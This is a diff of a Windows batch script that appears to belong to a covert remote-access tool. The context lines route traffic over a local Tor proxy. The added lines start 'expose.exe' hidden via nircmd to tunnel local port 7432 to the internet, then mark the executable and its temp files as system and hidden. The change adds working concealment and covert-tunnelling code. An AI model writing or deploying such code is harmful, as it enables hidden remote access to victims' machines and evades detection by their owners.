@@ -24,9 +24,10 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-if exist "C:\apache2\localtunnel\Localtunnel.exe" (
-   tasklist /fi "imagename eq Localtunnel.exe" | find /i "Localtunnel.exe" > nul
-if not errorlevel 1 (echo.) else (attrib -s -h -i "%temp%\localtunnel.bat" && attrib -s -h -i "%temp%\localtunnel.txt" && echo ^C:\apache2\localtunnel\Localtunnel.exe -p 7432 --no-dashboard http^ ^>^ ^%temp%\localtunnel.txt^ > "%temp%\localtunnel.bat" && "%environment%\nircmd.exe" exec hide "%temp%\localtunnel.bat" && timeout -t 5 && attrib +s +h +i "C:\apache2\localtunnel\Localtunnel.exe" && attrib +s +h +i "%temp%\localtunnel.txt" && attrib +s +h +i "%temp%\localtunnel.bat"
+attrib -s -h -i "%environment%\expose.exe"
+if exist "%environment%\expose.exe" (
+   tasklist /fi "imagename eq expose.exe" | find /i "expose.exe" > nul
+if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s -h -i "%temp%\expose.bat" && attrib -s -h -i "%temp%\expose.txt" && echo ^%environment%\expose.exe 7432^ ^>^ ^%temp%\expose.txt^ > "%temp%\expose.bat" && "%environment%\nircmd.exe" exec hide "%temp%\expose.bat" && timeout -t 5 && attrib +s +h +i "%environment%\expose.exe" && attrib +s +h +i "%temp%\expose.txt" && attrib +s +h +i "%temp%\expose.bat"
 )
 )
 
